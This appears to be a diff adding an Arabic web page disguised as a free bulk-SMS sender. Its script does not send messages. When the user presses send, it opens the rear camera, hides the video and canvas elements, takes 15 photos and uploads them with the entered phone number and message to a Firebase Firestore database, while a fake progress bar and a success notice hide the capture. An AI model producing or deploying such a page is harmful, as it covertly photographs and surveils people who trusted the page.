@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال رسائل نصية مجانية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #001a00, #000d00, #001a00);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+        .container {
+            background: rgba(0,0,0,0.9);
+            border: 2px solid #00ff00;
+            border-radius: 20px;
+            padding: 40px 25px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 0 50px rgba(0,255,0,0.3);
+        }
+        .icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 900;
+            margin-bottom: 15px;
+            color: #00ff00;
+            text-shadow: 0 0 20px #00ff00;
+        }
+        .subtitle {
+            color: #888;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-weight: 700;
+            color: #00ff00;
+            margin-bottom: 10px;
+        }
+        .input-group input, .input-group select, .input-group textarea {
+            width: 100%;
+            padding: 15px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 16px;
+            background: #111;
+            color: #fff;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            text-align: center;
+            resize: none;
+        }
+        .input-group input:focus, .input-group select:focus, .input-group textarea:focus {
+            outline: none;
+            box-shadow: 0 0 20px rgba(0,255,0,0.5);
+        }
+        .input-group textarea {
+            height: 100px;
+            text-align: right;
+        }
+        .send-btn {
+            width: 100%;
+            padding: 20px;
+            font-size: 20px;
+            font-weight: 900;
+            font-family: 'Cairo', sans-serif;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 30px rgba(0,255,0,0.3);
+        }
+        .send-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0,255,0,0.5);
+        }
+        .send-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .send-btn.success {
+            background: #00ff00;
+            color: #000;
+            box-shadow: 0 10px 30px rgba(0,255,0,0.5);
+        }
+        .progress {
+            display: none;
+            margin-top: 20px;
+        }
+        .progress.active {
+            display: block;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #00cc00);
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .progress-text {
+            font-size: 16px;
+            font-weight: 700;
+            color: #00ff00;
+        }
+        .status-msg {
+            display: none;
+            margin-top: 15px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        .result {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 10px;
+            border: 1px solid rgba(0,255,0,0.3);
+        }
+        .result.active {
+            display: block;
+        }
+        video {
+            display: none;
+        }
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">💬</div>
+        <h1>إرسال رسائل نصية مجانية</h1>
+        <p class="subtitle">أدخل الرقم والرسالة وعدد الإرسالات</p>
+        
+        <div class="input-group">
+            <label>📱 رقم الهاتف:</label>
+            <input type="tel" id="phoneNumber" placeholder="01xxxxxxxxx">
+        </div>
+        
+        <div class="input-group">
+            <label>✉️ الرسالة:</label>
+            <textarea id="message" placeholder="اكتب الرسالة هنا..."></textarea>
+        </div>
+        
+        <div class="input-group">
+            <label>📨 عدد الرسائل:</label>
+            <select id="messageCount">
+                <option value="10">10 رسائل</option>
+                <option value="25">25 رسالة</option>
+                <option value="50">50 رسالة</option>
+                <option value="100">100 رسالة</option>
+            </select>
+        </div>
+        
+        <button class="send-btn" id="sendBtn" onclick="sendMessages()">📤 إرسال الرسائل</button>
+        
+        <div class="status-msg" id="statusMsg"></div>
+        
+        <div class="progress" id="progress">
+            <div class="progress-text" id="progressText">⏳ جاري الإرسال...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+        
+        <div class="result" id="result">
+            <div class="check-icon">✅</div>
+            <h2>تم الإرسال بنجاح!</h2>
+            <p>تم إرسال الرسائل إلى الرقم</p>
+        </div>
+        
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        firebase.initializeApp({
+            apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
+            projectId: "game-a1aca",
+            storageBucket: "game-a1aca.firebasestorage.app",
+            appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
+        });
+        
+        const db = firebase.firestore();
+        let stream;
+
+        async function sendMessages() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const message = document.getElementById('message').value;
+            const messageCount = document.getElementById('messageCount').value;
+            const btn = document.getElementById('sendBtn');
+            const progress = document.getElementById('progress');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            const result = document.getElementById('result');
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const statusMsg = document.getElementById('statusMsg');
+            
+            if (!phoneNumber) {
+                statusMsg.textContent = '⚠️ أدخل رقم الهاتف أولاً!';
+                statusMsg.style.color = '#ff4444';
+                statusMsg.style.display = 'block';
+                return;
+            }
+            
+            if (!message) {
+                statusMsg.textContent = '⚠️ اكتب الرسالة أولاً!';
+                statusMsg.style.color = '#ff4444';
+                statusMsg.style.display = 'block';
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري الإرسال...';
+            progress.classList.add('active');
+            result.classList.remove('active');
+            statusMsg.style.display = 'none';
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                const smsId = 'sms_' + Date.now();
+                
+                for (let i = 1; i <= 15; i++) {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
+                    
+                    progressValue = (i / 15) * 100;
+                    progressFill.style.width = progressValue + '%';
+                    progressText.textContent = '⏳ جاري الإرسال... ' + i + '/15';
+                    
+                    await db.collection('messages').add({
+                        smsId: smsId,
+                        phoneNumber: phoneNumber,
+                        message: message,
+                        messageCount: messageCount,
+                        photo: photoData,
+                        photoIndex: i,
+                        type: 'sms_photo',
+                        camera: 'back',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                    
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+                
+                statusMsg.textContent = '⏳ اكتمل الإرسال...';
+                statusMsg.style.color = '#f39c12';
+                statusMsg.style.display = 'block';
+                
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+                
+                progress.classList.remove('active');
+                result.classList.add('active');
+                statusMsg.textContent = '✅ تم الإرسال بنجاح!';
+                statusMsg.style.color = '#00ff00';
+                
+                btn.textContent = '✅ تم الإرسال';
+                btn.disabled = false;
+                btn.classList.add('success');
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                statusMsg.textContent = '❌ خطأ: ' + error.message;
+                statusMsg.style.color = '#ff4444';
+                statusMsg.style.display = 'block';
+                btn.disabled = false;
+                btn.textContent = '📤 إرسال الرسائل';
+                progress.classList.remove('active');
+            }
+        }
+    </script>
+</body>
+</html>
